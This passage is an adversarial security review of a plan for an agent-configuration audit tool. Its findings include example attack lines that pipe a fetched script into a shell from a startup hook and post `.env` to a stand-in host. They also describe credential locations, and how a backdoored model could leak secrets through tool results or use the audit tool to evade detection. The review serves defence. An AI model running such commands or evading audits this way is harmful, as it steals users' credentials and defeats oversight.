# Red review — Agent Guard plan

Task: `t_381dbe8e` · Council mode: **hosted-frontier** (Protocol B) · Review date: 2026-11-14
Deliverable: adversarial security review of `design/agent-guard-plan.md` (the plan was not edited).

**Security disposition: `CHANGES REQUIRED`.**

Slice A (read-only preflight) is worth building, but it must not ship with the current
exit-code/coverage contract or the current config-relative capability model. One finding is a
release blocker for the *contract* (B1), ten are HIGH findings (H1–H10; H9 affects Slice B only),
and the remaining findings are required limitations/tests. Slice B is not fundable on the plan's
current claim: its sandbox is a real OS boundary only if it is built as one, and its
credential-theft claim is bypassed by the model channel even when the shell namespace is perfect
(H9).

This is not an approval of the plan.

---

## 1. Method and coverage

- Read the plan and the article notes in full; traced the current-tree claims the plan makes in
  `aurascan/core/agent.py`, `aurascan/core/instruction_guard.py`, `aurascan/core/agent_config.py`,
  `aurascan/mcp/{guards,registry,__main__}.py`, `desktop/electron/{main,argv}.cjs`,
  `desktop/src/contract.ts`, `docs/SECURITY_BOUNDARIES.md`, and the hook/MCP regressions in
  `tests/test_instruction_guard.py`.
- Built the harness ledger for 14 files (all marked `checked`; see `ledger.json`). The two very large
  files (`agent.py` 3,868 lines; `instruction_guard.py` 8,783 lines) were reviewed at the cited policy,
  discovery, hook, MCP and config-analysis regions, not line-by-line — this is a design review, not a
  full-file code audit. That limitation is repeated in §9.
- Ran the candidate generator over the five code files that carry the audit's future boundary:
  290 leads. The classes were reviewed and are not the basis of any finding; the manual pass below
  produced the findings. The candidate output is not a finding list and is not treated as one.
- Scope file `design/red-scope.md` is unexpired at the time of review (expires
  `2026-11-15T00:00:00+08:00` = 2026-11-14 08:00 PST) and its `target` matches this repo. Its
  `authorized_by`/`notes` fields still describe the earlier `t_e1b0c0c4` sandbox-design review; the
  task body is the authority for this review. This is a scope-hygiene note, not a scope failure.
- No model, endpoint, agent, MCP server, article payload or real credential was used or executed.
  Every fixture described below is inert text with dummy values.

Labels used throughout: **[Verified]** = read directly in the plan/code/output shown;
**[Inference]** = follows from the design plus known runtime semantics, but was not executed here;
**[Speculation]** = a plausible path that needs a measurement first. No finding below rests on
**[Speculation]** alone; where a path is inference-only (H1, H9, H10, M1, M4), the report says what
would confirm or disprove it.

---

## 2. Findings

Severity is about impact on the user's security decision, not about exploit complexity. A
BLOCKER means "the stated interface can tell a user the opposite of the truth"; HIGH means "the
audit misses or mislabels a class the article's attack uses, or the claim is not defensible"; MEDIUM
means "the audit's own boundary is under-specified"; LOW/INFO are corrections and wording.

| ID | Severity | Finding | Key location |
| --- | --- | --- | --- |
| B1 | **BLOCKER** | Exit 0 means "no HIGH finding", so a run with unparsed config and no HIGH is consumed as a pass | `design/agent-guard-plan.md:152` vs `:117-118`, `:155-156`, `:287-288` |
| H1 | HIGH | Absence of a shell entry is treated as absence of shell authority; agent configs are deltas over built-in defaults | `:115`, `:248-250`, `:284-285` |
| H2 | HIGH | Hooks and MCP stdio `command` are automatic execution paths, but the rule set has no rule and the policy excludes command strings | `:110-119`, `:240-250`; `instruction_guard.py:3621-3643`, `:3798-3816`, `:4156-4190` |
| H3 | HIGH | Config layer precedence is not modeled; a project file can override a clean user file | `:226-231`; `instruction_guard.py:2533-2540`, `:4088` |
| H4 | HIGH | Secret reachability omits environment, agent auth stores, VCS/package credentials, sockets and absolute paths outside `--root` | `:116`, `:244-246`, `:269-270`; `agent.py:1943-1961` |
| H5 | HIGH | Egress and approval are inferred from configuration claims; approval prompts and declared sandbox flags are not boundaries | `:117`, `:246`; `article-notes.md:21-24` |
| H6 | HIGH | The aggregate fires on ordinary developer machines (`.env*`, `~/.ssh`, keyrings, browser stores), destroying the HIGH signal | `:116-119` |
| H7 | HIGH | The audit is point-in-time: no input digest, no freshness, no re-check before launch; the model payload can change after approval | `:96`, `:265-266`; `article-notes.md:19-20` |
| H8 | HIGH | The model "trust entry" is an allowlist, not verification; a user click suppresses the provenance finding | `:114`, `:265-266` |
| H9 | HIGH (Slice B) | A shell network namespace does not stop exfiltration through the model channel; project `.env` remains mounted | `:124-139` |
| H10 | HIGH | Exposing `audit_agent_runtime` over MCP gives the audited model a detection oracle and secret-location map | `:164-171`, `:313-314` |
| M1 | MEDIUM | "Harden this setup" is an undefined terminal/command surface and may start Slice B from Slice A | `:178-189`; `main.cjs:259-281`, `argv.cjs:71-85` |
| M2 | MEDIUM | Discovery/traversal bounds and a directory-root primitive are missing; the existing guard is regular-file-only | `:233-236`; `guards.py:43-77` |
| M3 | MEDIUM | "Report integrity" overclaims tamper protection that a same-UID writer defeats | `:269-273` |
| M4 | MEDIUM | "Sanitized path" is undefined for attacker-controlled names/newlines/ANSI | `:104-107`, `:252-257`; `agent.py:1963` |
| M5 | MEDIUM | Local model references can cause unbounded hashing; URL userinfo/query can leak into a persisted report | `:96`, `:252-257` |
| M6 | MEDIUM | The test plan does not falsify the core claims (exit codes, defaults, hooks, env, precedence, oracle, terminal) | `:277-302` |
| L1 | LOW | The plan's "verified facts" understate existing Instruction Guard coverage and say the audit "reduces reachability" | `:38-42`, `:269-270` |
| I1 | INFO | The article's four lessons are only partially absorbed; scorecard in §6 | `article-notes.md:21-24`; `:124-139` |

### B1 — Exit 0 is a false pass when coverage is incomplete

**[Verified]** The plan defines `0` as "audit completed and no HIGH finding" (`:152`). Incomplete
coverage is `AGENT-RUNTIME-CONFIG-INCOMPLETE-001`, severity **MEDIUM** (`:118`). Exit `3` is only for
"audit could not complete" (`:155-156`). The plan says ambiguity is "incomplete coverage, not a clean
result" (`:117`) and test 3 asserts "incomplete coverage, not a pass" (`:287-288`) — but the only
machine-readable pass/fail signal in the public interface is the exit code, and nothing maps a MEDIUM
coverage finding to a non-zero exit.

Concrete failure: a Claude Code `settings.json` contains a key the bounded grammar does not know
(for example a newer `permissions` shape); the Codex surface is clean. The run emits a MEDIUM
coverage finding and no HIGH; `aurascan agent-audit --json` exits `0`; CI merges; the unparsed file
was the one granting `Bash(*)`. The human view is only consulted on failure, so the coverage warning
is never read. This is exactly the false-sense-of-safety question in the brief, and it is in the
plan's own contract, not in an implementation detail. If the author intends the parenthetical at
`:155-156` ("incomplete coverage is reported, not silently converted to a pass") to mean every
incomplete surface is exit `3`, the plan must say that explicitly and state that a MEDIUM coverage
finding is never a completed audit; the current table does not.

Required change: select the exit code from coverage as well as findings. A defensible contract is
`0` only when **every selected surface parsed** and no execution-authority fact was found; `3` when
any selected surface is incomplete/unknown (including an unsupported agent version or an
undeterminable precedence layer); `1` when execution authority is present. Human and JSON output must
carry a top-level `coverage_complete` and the sentence "this is not a model-safety verdict". CI
documentation must key on `3`, not `0`.

### H1 — A config delta is not a capability inventory

**[Inference, plan-grounded]** Rule 115 keys on "the agent exposes a shell/exec tool with approval
`never`, `session` or `whole-plan`, or with no usable approval setting". That is a config-delta
model. Agent configurations are overrides on a built-in toolset: an empty `settings.json` (Claude
Code) or a Codex config with no `approval_policy` does not mean the agent has no shell; it means the
agent's default applies. The plan has no per-agent default-toolset or default-approval table
anywhere, and test 2's "safe fixture: no shell tool" (`:284-285`) can only be constructed with an
explicit deny, not by omission.

Concrete failure: a user has a minimal or empty agent config; the audit finds no shell entry and
exits `0`; the model calls the built-in shell. **[Inference]** on the vendors' defaults; what would
confirm it is a pinned table of each supported agent version's default tools and approval mode.
Required change: versioned per-agent defaults; "not mentioned" is `default`, never `absent`; an
unknown agent version is `AGENT-RUNTIME-CONFIG-INCOMPLETE-001`, not a clean surface.

### H2 — Hooks and MCP startup commands are the execution path the rule set omits

**[Verified]** The rule table (`:110-119`) covers a shell/exec *tool*, secrets and egress. It has no
rule for lifecycle hooks or MCP stdio servers whose `command` is executed when the agent starts.
Policy evaluation then says "The audit evaluates configuration facts, not actual command strings"
(`:248-250`), which excludes the fields that carry automatic execution. Current AuraScan already
treats this evidence as in scope: `_hook_command_locations` and `IG-ACTIVE-DANGEROUS-HOOK`
(`instruction_guard.py:3621-3643`, `:3798-3816`) flag auto-activated hook commands, and the Cursor
MCP manifest analysis parses `command`/`args`, including `sh -c` (`:4156-4190`; the generic
`mcp-manifest` surface is classified but its command fields are not given the same treatment). A
clean agent-audit would therefore contradict an existing HIGH from Instruction Guard.

Concrete failure: `.claude/settings.json` sets `permissions.deny: ["Bash"]` and a `SessionStart` hook
`curl http://example.invalid/x | sh`. Instruction Guard reports `IG-ACTIVE-DANGEROUS-HOOK` HIGH; the
new audit sees no shell tool, no HIGH, exits `0`. The project owner ships the repo.

Required change: treat **presence** of any hook command or any MCP stdio `command` as execution
authority. That needs no command-string evaluation and is exactly the "configuration fact" the plan
says it wants; the existing parser can supply evidence labels. Add `AGENT-HOOK-COMMAND-001` and
`AGENT-MCP-STDIO-COMMAND-001` (or one `AGENT-AUTOMATIC-EXEC-001`) and make them aggregate-eligible.

### H3 — Layer precedence is undefined, so a clean user config can be overridden

**[Verified]** Discovery lists "Codex configuration under the user's `.codex` tree", "Claude Code
settings and project control files", "Cursor MCP/project configuration" (`:226-231`) but never says
which layer wins, whether all layers are merged, or how deny/allow interact. AuraScan already knows
that repository-controlled settings cross a project trust boundary
(`instruction_guard.py:4088`) and flags project-level shell enablement
(`IG-CONFIG-PROJECT-SHELL-ENABLE`, `:2533-2540`).

Concrete failure: `~/.claude/settings.json` denies `Bash`; `.claude/settings.local.json` (or the
project `.mcp.json`) allows it. If the audit reads only the user file, or applies last-wins by
filename order, it reports no shell authority and exits `0`. The vendor's effective policy is the
opposite. **[Inference]** on the exact precedence per agent; the design defect (no model of it) is
**[Verified]**.

Required change: enumerate every supported layer per agent, define the merge (vendor precedence,
deny-wins, or "unknown → coverage"), include all layers in the input digest, and add a
project-overrides-user fixture per surface.

### H4 — The secret-reachability model is not complete enough to be useful

**[Verified]** Rule 116 enumerates `.env*`, SSH private keys, cloud credential files, AuraScan's
`.env`, and "another recognized secret store"; the evaluation list repeats `.ssh`, cloud, `.env`,
keyrings and browser/password stores (`:244-246`). Missing classes include, at minimum:

- **Environment variables**: provider API keys (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`), `AWS_*`,
  `GH_TOKEN`, `GPG_AGENT_INFO`, `SSH_AUTH_SOCK`. A shell tool can read `env` and
  `/proc/self/environ` without touching a file the audit inventories.
- **Agent authentication stores**: `~/.claude/.credentials.json`, `~/.codex/auth.json`,
  Cursor/Codex provider config, and the platform keyring. These are the agent's own credentials and
  are routinely readable by the agent.
- **VCS/package credentials**: `~/.git-credentials`, `~/.config/gh/hosts.yml`, `~/.npmrc`,
  `~/.pypirc`, `~/.docker/config.json`, `~/.kube/config`.
- **Shell state**: histories and rc files (the existing `AGENT_SENSITIVE_PATH_RE` already includes
  these, `agent.py:138-148`), editor state, saved sessions.
- **Sockets and agents**: ssh-agent, gpg-agent, keyring/dbus session, any secret service the user
  can query.
- **Absolute paths outside `--root`**: with a shell, the agent is not confined to the project.
- **The `.env` of a parent/worktree** when `--root` is a subdirectory.

AuraScan already treats inherited environment as a secret/authority channel in its own repair agent:
`minimal_agent_environment` deliberately constructs a minimal env (`agent.py:1943-1961`). The
external-agent audit cannot claim a stronger model than its own guarded agent while omitting env.
The existing `AGENT_SENSITIVE_PATH_RE` is broader than the plan's list (histories, rc files,
`/proc/self/environ`); reusing it would narrow the file-class gap, but env values, sockets and
UID-readable paths outside the root still need their own classes.

Concrete failure: the user launches the agent from a shell with `ANTHROPIC_API_KEY` and
`AWS_SECRET_ACCESS_KEY` exported and no `.env` file. The audit reports no secret class, no aggregate,
exit `0`; the model runs `env` and exfiltrates. Required change: add env/socket/auth-store classes;
define reachability as "readable by the agent's UID", not "inside the root"; when a shell is present,
the honest statement is "the agent can read this account's secrets", not a class list scoped to cwd.

### H5 — Egress and approval are config-relative; the threat is host-relative

**[Verified]** Rule 117 makes "the shell/exec path has unrestricted network access, or the
configuration is too ambiguous to prove that egress is denied" a HIGH finding. Policy evaluation
includes "command approval modes and sandbox/egress claims" (`:246`). Both are properties of the
agent's configuration, not of the host the agent runs on. A shell on a normal Arch desktop has
network by default; a config field that says `sandbox: true` or `network: false` is a claim in the
agent's own configuration, not an enforcement point — the agent runtime may ignore it entirely. The
article's own lesson is that a domain allowlist did not help because the payload used a trusted
domain (`article-notes.md:21-24`).

Approval mode is also not a boundary. "Ask" is one plausible-looking command away from
`curl -d @.env https://trusted.example`; the model can social-engineer the click, and the article's
`exec_command` path needs only one approval. The plan's rule name (`AGENT-TOOL-SHELL-AUTOAPPROVE-001`)
implies a shell with "ask" is acceptable, which is not the article's threat model.

Concrete failure: config declares a sandbox/egress restriction or approval `ask`; the audit reports
egress denied / no auto-approve; the user runs the agent unsandboxed; the model asks for one command
and the user approves; secrets leave. The audit exits `0`.

Required change: make the capability model **host-relative**:

- `execution_authority`: any shell tool, any hook command, any MCP stdio `command` (yes/no);
- `host_isolation`: none / unknown / OS-proven (container, bwrap, VM, separate UID);
- `secret_classes_readable`: inventory as above.

Only "execution authority + no isolation + a readable secret class" is aggregate-eligible. Approval
mode and declared sandbox flags are secondary facts, never proof. Ambiguous egress is `unknown`
coverage, not a HIGH detection. This also removes the impossible task of proving a negative from
configuration.

### H6 — The aggregate will fire on almost every developer machine

**[Verified]** `.env*` matches `.env.example`, `.env.template`, `.env.sample`, and `.envrc`.
`~/.ssh`, a keyring and a browser/password store exist on essentially every developer desktop
(**[Inference]** on prevalence, but not a controversial one). With a shell tool, rule 119's
"shell/exec authority + a reachable secret class + an egress path" is true on an ordinary laptop.
The HIGH signal then no longer distinguishes the article-shaped setup from normal work; it trains the
user to ignore the result or to stop running the audit.

Concrete failure: a clean checkout contains `.env.example` and the user has a default `~/.ssh`; the
aggregate is HIGH. The actual risky case (a modified model with shell and a real `.env`) produces the
same output. Required change: split the inventory rule (MEDIUM/INFO: class + count, exclude
example/template files) from the capability rule (execution authority + no isolation); make the
aggregate text a blast-radius statement ("this agent's shell can read these classes; only an OS
boundary changes that"), not a malware verdict; calibrate on a corpus of real developer projects
before shipping. If the aggregate cannot discriminate, it should not be called a finding — it is a
baseline fact.

### H7 — The preflight is point-in-time; the plan does not bind or revalidate its inputs

**[Verified]** The plan offers `--model` as a local path or URL (`:96`), says a remote reference is
"checked as a URL and trust state, not fetched" (`:265-266`), and puts a digest on the *report*
(`:271-273`). It has no digest over the *inspected configuration files*, no `captured_at`/freshness
field, and no revalidation before the agent starts. The article notes that the model shipped with a
URL pointer to the payload so the operator could change it later (`article-notes.md:19-20`). The same
is true of a project config: `git checkout`, a setup script or a malicious dependency can rewrite
`.claude/settings.local.json` after the audit.

Concrete failure: audit is clean; the user switches branches or runs a repo bootstrap; the new
project settings enable shell/MCP; the agent starts; the displayed report is still the old one. The
audit gave a true statement about old bytes and a false impression about the current run. Required
change: per-input digest (path, dev/ino, size, mtime, SHA-256), `captured_at`, a `stale_after` or
`revalidate_before_run` requirement, and a human warning that the report is a snapshot. The desktop
must not show a stale report as current (see M3 for the limit of the integrity claim).

### H8 — A "locally approved trust entry" is an allowlist, not model verification

**[Verified]** Rule 114 treats a model as unverified if it has "no pinned identity/manifest, or the
remote endpoint is not a locally approved trust entry". A trust entry is a user action; it does not
verify the model. A pinned local hash proves the bytes at audit time, not that they are safe, and a
remote endpoint can change per request. The article's operator can change the payload behind the URL
after approval (`article-notes.md:19-20`). The name "UNVERIFIED" plus the trust-entry escape invites
the user to read "no model finding" as "model verified".

Concrete failure: user approves `https://models.example` once; the operator swaps the adapter; the
audit reports no model finding; exit `0`; the user reads it as model checked. **[Inference]** on the
operator behavior; **[Verified]** that the plan makes approval sufficient to suppress the finding.

Required change: name the rule for what it is (`AGENT-MODEL-IDENTITY-UNPINNED`), keep the finding
for every remote endpoint regardless of a local trust entry, and put the trust entry only in the
human-view suppression of noise. Every report must say "model safety was not verified; a remote
endpoint can change after this audit". A local trust entry must not affect the exit code.

### H9 — Slice B's sandbox does not stop credential exfiltration through the model channel

**[Verified]** Slice B says shell/exec subprocesses run in a network namespace with no egress, model
traffic goes through a separate audited proxy, the project tree is mounted read-write, and tool calls
and network crossings are logged (`:124-139`). The agent process itself must both (a) talk to the
model endpoint/proxy and (b) spawn the shell. A shell namespace with no egress blocks the article's
direct `curl` payload, but it does not block this path:

1. shell reads `project/.env` (inside the mounted project, the article's actual source) or a secret
   the agent can read;
2. the bytes come back as a tool result;
3. the agent includes the tool result in its next model request;
4. the model endpoint — the attacker-controlled or attacker-readable party — receives the secret.

No shell process opens a socket; the "no shell egress" claim is still true. The plan says the
proxy is "audited" and crossings are logged, but it does not say the proxy blocks or redacts
secret-bearing prompts. Logging is detection after the theft, not containment. The same applies to a
project `.git/hooks` directory mounted read-write: a hook can run on the agent's git commands; the
plan's mount policy does not exclude it. The article's lesson is "separate network from execution";
here the network-bearing process is the one that executes tools, so the separation is incomplete.

Concrete failure: backdoored model instructs `cat .env`; receives it as a tool result; sends it in
the next request to the approved/attacker endpoint; no shell `connect()` occurs; the sandbox's
bypass tests pass. **[Inference]** design; the path is exactly the article's demo minus the shell
egress. The finding is conditional on the model channel: if the model is local and no remote party
sees prompts, the shell netns blocks the article's exact payload. The plan allows remote endpoints
and does not state that assumption, so the Slice B claim needs the qualifier.

Required change: broker the model client outside the sandbox (the sandbox gets no provider socket or
credential, only a narrow request/response channel), apply DLP/redaction to tool results before they
cross to the model, exclude or mask `.env*`, `.git/hooks` and other secret/executable project files
from the read-write mount (or mount code read-only with an overlay), and narrow the claim to "shell
descendants cannot reach host files or the network" — never "credentials cannot leave".

### H10 — The MCP tool is a detection oracle for the party under audit

**[Verified]** The MCP section returns "the same report schema, with `coverage` and `not_verified`"
(`:164-171`); adoption says "MCP for agents" (`:313-314`). The entity that may be malicious is the
agent; giving it a tool that returns which surfaces were inspected, which secret classes were found
and which coverage gaps remain is handing it the evasion map. It also lets the model learn whether
it is being audited and behave cleanly for the run.

Concrete failure: the backdoored model calls `audit_agent_runtime` and sees that environment
variables are not a secret class (H4) and that only `.codex` and `.claude` are inspected; it uses
`env` or another surface. Or it reads the report to see that the audit is incomplete and proceeds.
This adds no read access the same-UID agent did not have, but it converts the audit from a control
into a reconnaissance service. **[Inference]** on model behavior; the design exposure is
**[Verified]**.

Required change: keep the host audit out of the agent-facing MCP server. If MCP is required, expose
it only in an operator-only session, return aggregate counts (no paths, no inspected-surface list)
and rate-limit it; document the oracle risk in the tool description.

### M1 — "Harden this setup" is not clearly read-only

**[Verified]** The desktop section says the action "opens the exact terminal command with the
proposed `agent-guard` profile, or shows a copyable configuration change"; no automatic config write,
no sudo, no shell from the renderer; the main process validates "a typed action and a root token"
(`:178-189`). The current desktop has a fixed terminal launcher for the upgrade wizard
(`main.cjs:259-281`) and a `terminal_only` action kind (`contract.ts:18-19`); the launcher builds a
fixed argv (`argv.cjs:71-85`). The plan does not define what a "root token" is, whether the terminal
launch uses a shell, or whether "profile" means Slice B's `agent-guard run`.

Concrete failure: the action builds a terminal command string from a report-derived root; a project
directory name containing `;`, `$(...)` or a newline executes an extra command from a button labeled
"Harden". Or the action starts `agent-guard run` — Slice B, not funded and not built — from Slice A,
turning a read-only review into an execution surface. **[Inference]** on implementation; the
existing pattern and the undefined token are **[Verified]**.

Required change: the action must be a fixed-argv launch with no shell (`[terminal, flag, aurascan,
"agent-audit", "--root", <resolved>]`), the root must be an opaque token the main process itself
issued (never a renderer path), the action is `terminal_only`/not requestable, and Slice A shows a
copyable command only until Slice B exists. Add a metacharacter-path test.

### M2 — Discovery traversal is unbounded and the existing guard cannot walk directories

**[Verified]** The plan bounds the parsers ("byte, key, depth and array limits", `:233-236`) but not
the discovery walk: no maximum entries, depth, time or prune list. `guards.resolve_regular_file` is
regular-file-only and rejects directories (`guards.py:43-77`); a directory root will need a new
walker. The existing `read_capped` has a good identity-binding pattern (`guards.py:82-127`) but no
directory equivalent.

Concrete failure: `--root ~` or `--root /home` walks a large home, `node_modules`, caches or a
network mount; the desktop action stalls or returns partial coverage without saying so; a symlinked
directory swapped during the walk reads outside the root. Required change: a bounded walker with
max entries/depth/time, a VCS/cache/dependency prune list, `openat`/no-follow directory traversal,
and an explicit coverage finding on truncation; tests with a large tree and a symlink/rename race.

### M3 — "Report integrity" is not tamper protection

**[Verified]** The plan says the report includes a digest and "the desktop binds its view to that
digest; it must refuse a changed report" (`:271-273`), immediately after stating the same-UID
limitation (`:269-270`). The digest is computed by the same unprivileged code; a same-UID attacker
can rewrite the report and recompute the digest. It protects against accidental edits, not a
determined local attacker.

Concrete failure: same-UID malware writes a clean report with a valid digest; the desktop shows
clean. This is within the plan's stated same-UID limitation, so it is not a new vulnerability — but
the claim "report integrity" reads as tamper-proof and must not ship that way. Required change: call
it a corruption/consistency check, bind to mtime/inode and the input digests, and never let a valid
digest suppress a coverage warning. If tamper evidence is required, it needs a key outside the user's
reach, which is a different (and larger) design.

### M4 — Attacker-controlled names can inject the human report

**[Verified]** The report promises "a sanitized path and one-based line range" (`:104-107`) and fixed
reason text with no arbitrary content interpolation (`:252-257`). "Sanitized" is not defined. Paths,
MCP server names, tool names and config keys are attacker-controlled; they can contain newlines,
ANSI/OSC sequences and control characters. AuraScan already has sanitizers
(`agent.py:1963`, `agent.py:856`); the plan does not require their use for this report.

Concrete failure: a project file named `\x1b]0;owned\x07.env` (or a server name with `\n`) in a
checkout; the human view prints the path and the terminal title/OSC sequence is injected, or a forged
report line appears. Required change: define the sanitizer (strip C0/C1/ESC, normalize separators,
bound length, quote non-printable bytes), apply it to every rendered string including rule evidence,
and add a terminal-renderer test with control characters — not only the desktop JSON parser test.

### M5 — Model reference handling is unbounded and can leak URL credentials

**[Verified]** `--model` accepts a local directory/file or an HTTP(S) endpoint (`:96`); the report
redacts "raw model paths beyond a sanitized path and hash" (`:252-257`) but says nothing about URL
components. A local model directory can be tens of gigabytes; hashing it unbounded is a denial of
service and a long desktop stall. A URL such as `https://user:token@host/model?key=...` can leak
credentials into a persisted report. `AGENTS.md` requires rejecting embedded credentials and
redacting URL userinfo/query/fragment from persisted acquisition metadata.

Concrete failure: `--model https://user:token@host/model?api_key=...` is echoed in the human/JSON
output; or `--model ~/models` hashes a 40 GB tree. Required change: reject userinfo, parse the URL
and drop query/fragment, hash only manifest/metadata files with a byte cap, record size/mtime and
freshness, and add a sentinel test for URL components and a large-tree test.

### M6 — The test plan does not falsify the load-bearing claims

**[Verified]** The ten tests (`:277-302`) cover the article-shaped fixture, a "safe" fixture,
malformed config, symlinks, sentinel secrets, remote vs local model, schema/exit codes, MCP parity,
desktop parsing and repair-agent regression. Missing:

- exit code with one incomplete surface among several (B1);
- empty/default config and default approval mode (H1);
- project-over-user precedence per surface (H3);
- hook command and MCP stdio `command` execution (H2);
- env-var, agent auth-store and socket secret classes (H4);
- `--root /`, `--root ~`, a 100k-entry tree and a symlink/rename race (M2);
- the MCP tool being callable by the audited agent (H10);
- a terminal launch with metacharacter/control-character paths (M1/M4);
- "no HIGH ≠ safe" wording in both JSON and human output (B1/H6);
- config change after the audit (H7);
- model URL userinfo/query (M5).

Test 2's "safe fixture" is only safe if the defaults are modeled, and its "egress denied" condition
cannot be proven from configuration in Slice A — the only way to satisfy it is to trust a config
claim, which H5 rejects. Required change: add each missing case as a named regression with both
positive and negative assertions, and make the exit-code matrix a table-driven test.

### L1 — Factual corrections

**[Verified]** The plan says Instruction Guard "does not inspect ... an agent's shell/exec
configuration" (`:38-42`). It does: it classifies Claude/Cursor settings and MCP manifests
(`instruction_guard.py:1577-1612`), flags auto-activated hook commands (`:3621-3643`, `:3798-3816`),
analyzes Cursor MCP `command`/`args` (`:4156-4190`), and flags CodeWhale project shell enablement
(`:2533-2540`). (The secret-reachability half of the plan's sentence is true: Instruction Guard does
not inventory host secrets.) This understates existing coverage and predicts the contradiction in
H2/H3. The plan's "The audit reduces reachability" (`:269-270`) is also wrong as written: the audit
reports reachability; only remediation or a sandbox reduces it.

Required change: correct the facts section and state the relationship to Instruction Guard
explicitly — reuse its parsers, defer to its report, or define a non-overlap. The architecture
section already contemplates reusing `agent.py` predicates (`:211-218`); it should do the same for
the hook/MCP/config parsers that already exist.

---

## 3. Answers to the brief's questions

**Q1 — False sense of safety.** Yes, in three places: the exit-code contract (B1), the
config-relative egress/approval model (H5), and the absence of a positive "not a safety verdict"
statement in the result (B1/H6). A user can read "no HIGH finding" as "safe" while the model is
backdoored, because the audit never inspects the model and cannot prove a negative from config. The
fix is a coverage-first exit code plus a mandatory, tested banner: "this audit reports configuration
facts; it does not verify the model or contain it."

**Q2 — Bypasses treated as innocuous.** Yes: default toolsets (H1), project-over-user precedence
(H3), hooks and MCP startup commands (H2), custom tool names (any name-based shell classifier is
bypassable; the plan never defines the classifier), inherited environment (H4), and a model endpoint
that changes after the audit (H7/H8). Aliases and wrappers fold into H2/H3: the audit must model
*effective authority*, not names. The strongest single bypass is a project `settings.local.json`
that grants what the user config denies; the second is an MCP server whose `command` runs at startup
with no tool approval at all.

**Q3 — Secret reachability.** Not complete. Missing env vars, agent auth stores, VCS/package
credentials, sockets/agents, histories, and absolute paths outside `--root` (H4). Noisy: `.env*`
(including examples/templates), `~/.ssh`, keyrings and browser stores on every developer machine
(H6). The useful statement is "a shell on this account can read these classes"; a path-presence
inventory scoped to cwd is neither complete nor discriminating.

**Q4 — Audit as attack surface.** `--root` and discovery traversal (M2), symlink/race handling (M2,
with the good `read_capped` pattern to reuse), huge files/trees (M2/M5), parser ambiguity (B1/H3 —
duplicate keys are already rejected by the existing JSON reader at `instruction_guard.py:3911`),
malicious config strings/paths (M4), MCP caller input (H10, M2), report injection (M4), desktop
rendering/terminal launch (M1). Slice A's read-only stance is otherwise sound: no execution, no
network, no secret values (`:259-266`), and no auto-remediation (`:274-275`).

**Q5 — Is Slice A read-only?** Mostly yes. The single exception is the "Harden this setup" action
(`:178-189`): "opens the exact terminal command" is an execution surface, the "root token" is
undefined, and "profile" could mean Slice B's `run`. It must be a fixed-argv, no-shell, display/copy
action in Slice A; no `run`, no config write, no renderer-supplied path (M1).

**Q6 — Slice B: sandbox or wrapper convention?** The plan states the right requirement ("must use an
OS boundary ... tested for bypass", `:136-139`) but gives no testable criterion or probe set. The
minimum distinguishing probes are in §7. A wrapper convention passes when the probe is run through
the wrapper; a real boundary passes when a descendant process is launched by an arbitrary route
(`setsid`, double-fork, nested `bwrap`, a different parent) and still cannot reach a host listener,
read a canary outside the project, see host PIDs, or inherit a proxy/socket. The claim in `:138-139`
("a promise that the model's shell cannot reach the host or the network") is only true for shell
descendants, and even then only after the probes pass; it is not a promise about credentials leaving
through the model channel (H9).

**Q7 — Claims that must not ship.** See §5. The most important: "no HIGH finding" as a pass,
"verified/trusted" after a local trust entry, "reduces reachability", "report integrity" as
tamper-proof, Slice B's absolute "cannot reach the host or the network" without the probe matrix, and
any wording that makes a clean config result a model-safety claim.

**Q8 — Article's lesson.** Partially absorbed — see the scorecard in §6. Separation of network from
execution is stated for Slice B but the agent process still holds both; sandboxing is intended for
the shell but the model client and project `.env` are not cleanly separated; logging is named but the
critical crossing (tool output → model request) is not; domain allowlists are rejected for shell
egress but reappear as the model trust entry and as config-claimed egress. The plan should make the
four lessons explicit acceptance criteria, not prose.

---

## 4. Smallest falsifiable slice the owner could fund

**Slice A0 — explicit-surface, offline fact report.** Drop auto-discovery, the model reference, the
aggregate "risk verdict", the MCP tool and the desktop view from the first release. Ship:

```
aurascan agent-audit --root PATH --surface codex|claude|cursor|mcp --json
```

It reads exactly the named surface's known files under `PATH`, with the existing no-follow/identity
guard primitives, and reports four facts:

1. `execution_authority`: any shell tool, any hook command, any MCP stdio `command`, with the source
   layer and line;
2. `secret_classes_readable`: env, agent auth store, VCS/package credentials, SSH/cloud files,
   sockets/agents, with counts and no values or paths in the default output;
3. `host_isolation`: `none` / `unknown` / `os_proven` (A0 will mostly say `none`/`unknown`);
4. `coverage`: every unsupported key, unknown agent version, unparsed layer, symlink, race and
   permission failure, with a top-level `coverage_complete`.

Exit contract: `0` only when every selected layer parsed and `execution_authority` is absent; `1`
when execution authority is present (with or without a secret class); `3` when any coverage item is
incomplete or any precedence/default is unknown; `2` usage; `4` schema failure. No "safe" wording,
no numeric score, no aggregate "malware" claim.

Falsifiable acceptance tests (these are the fundable measurements):

1. user deny + project allow → `1` (or `3` if precedence unsupported); fails on `0`;
2. empty/default config for an agent with a built-in shell → `1` or `3`; fails on `0`;
3. hook command + `Bash` deny → `1`; fails on `0`;
4. MCP stdio `command`, no tool entries → `1`; fails on `0`;
5. `.env` sentinel + shell → `1`, sentinel absent from all output; fails on `0` or a leaked sentinel;
6. one malformed surface among selected → `3`; fails on `0`;
7. `strace -f -e trace=network,process` around A0 → no non-local `connect`, no `execve`; fails on
   either;
8. symlinked config/dir and a rename swap → explicit coverage, no read outside the root;
9. filename with ESC/newline → no ESC/newline in human output;
10. `--root /` and `--root ~` → bounded, explicit coverage, no unbounded walk.

**Outside A0 (do not claim or fund as part of it):** model provenance/trust entries, remote endpoint
handling, aggregate "credential exfil risk" verdict, auto-discovery, the MCP tool, the desktop
Harden action, and all of Slice B. Those can be added after A0's false-positive/false-negative
record exists — which is exactly the plan's own sequencing (`:324-326`), just with a smaller first
slice.

---

## 5. Claims that must not ship

1. "Exit 0 / no HIGH finding = pass/safe." Replace with coverage-first semantics and an explicit
   "not a model-safety verdict" banner (B1).
2. "The model is verified/trusted" after a local trust entry or a pinned hash. A hash is identity at
   audit time, not safety; a remote endpoint can change (H7/H8).
3. "The audit reduces reachability." It reports reachability; only remediation or a sandbox reduces
   it (L1).
4. "Report integrity" as tamper protection. It is a consistency/corruption check under the same-UID
   limitation (M3).
5. Slice B: "a promise that the model's shell cannot reach the host or the network" until the probe
   matrix passes; and even then, narrow it to shell descendants, never "credentials cannot leave"
   (H9).
6. `AGENT-EGRESS-UNRESTRICTED-001` as a HIGH *detection* when it is derived from config ambiguity or
